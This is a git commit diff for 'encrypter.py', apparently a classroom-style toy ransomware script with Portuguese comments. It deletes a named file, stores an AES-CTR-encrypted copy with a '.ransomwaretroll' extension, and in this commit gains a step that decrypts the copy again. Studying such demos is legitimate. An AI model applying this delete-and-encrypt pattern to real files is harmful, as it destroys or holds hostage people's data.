5bf8b4ce47692bc459e1dcf14435bef4e606876b
Tiago Monteiro <leizem@gmail.com>
2024-12-14 13:55:55 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -7,7 +7,7 @@ file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+## remover o arquivo original
 os.remove(file_name)
 
 ## chave de criptografia
@@ -18,7 +18,24 @@ aes = pyaes.AESModeOfOperationCTR(key)
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+new_file_name = file_name + ".ransomwaretroll"
+with open(new_file_name, 'wb') as new_file:
+    new_file.write(crypto_data)
+
+print(f"Arquivo '{file_name}' foi criptografado como '{new_file_name}'.")
+
+## Parte adicional: descriptografar o arquivo
+# Abrir o arquivo criptografado
+with open(new_file_name, 'rb') as encrypted_file:
+    encrypted_data = encrypted_file.read()
+
+# Descriptografar os dados
+aes = pyaes.AESModeOfOperationCTR(key)  # Cria novamente o objeto AES com a mesma chave
+decrypted_data = aes.decrypt(encrypted_data)
+
+# Salvar o arquivo descriptografado
+decrypted_file_name = "decrypted_" + file_name
+with open(decrypted_file_name, 'wb') as decrypted_file:
+    decrypted_file.write(decrypted_data)
+
+print(f"Arquivo criptografado '{new_file_name}' foi descriptografado como '{decrypted_file_name}'.")
